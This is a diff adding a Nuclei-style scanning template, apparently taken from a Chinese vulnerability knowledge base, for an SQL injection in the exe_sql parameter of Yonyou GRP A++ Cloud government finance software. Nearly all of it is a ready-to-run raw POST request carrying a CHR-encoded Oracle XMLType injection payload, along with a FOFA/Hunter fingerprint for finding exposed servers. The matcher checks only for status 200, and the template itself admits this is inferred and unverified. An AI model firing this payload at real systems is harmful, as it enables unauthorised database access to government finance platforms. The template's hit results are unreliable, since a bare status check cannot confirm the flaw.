@@ -1,0 +1,42 @@
+id: poc-f1ea67fb235ca033d966
+info:
+  name: 用友GRPA++Cloud政府财务云exe_sql存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/f1ea67fb235ca033d966c26b706c71cf
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: f1ea67fb235ca033d966c26b706c71cf
+    fofa: + hunter`web.body="/pf/portal/login/css/fonts/style.css"`
+http:
+- raw:
+  - 'POST /gla/dataSource/selectGlaDatasourcePreview HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Length: 279
+
+    Accept: */*
+
+    X-Requested-With: XMLHttpRequest
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
+
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Connection: close
+
+
+    exe_sql=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(122)||CHR(107)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (2867=2867) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(98)||CHR(118)||CHR(107)||CHR(113)||CHR(62))) FROM DUAL)&pageNumber=1&pageSize=10&exe_param=11,1,11,1,11,1'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
